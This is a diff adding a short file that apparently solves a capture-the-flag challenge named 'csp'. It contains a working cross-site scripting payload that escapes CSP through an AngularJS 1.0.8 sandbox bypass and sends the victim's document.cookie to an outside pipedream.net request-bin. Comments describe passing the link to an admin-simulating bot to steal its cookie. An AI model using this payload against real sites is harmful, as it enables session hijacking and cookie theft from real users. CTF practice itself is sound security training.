@@ -1,0 +1,5 @@
+// this the script to inject for the "csp" challenge.
+
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script><div ng-app ng-csp>{{$eval.constructor('document.location = "https://eo8cgxvqm8oxt7m.m.pipedream.net/?" + document.cookie')()}}</div>
+
+//then we have to put the link of the injected page into the "bot" which simulates the admin, and then we'll see here "https://eo8cgxvqm8oxt7m.m.pipedream.net/?" (the request bin the admin's cookie => so the flag)
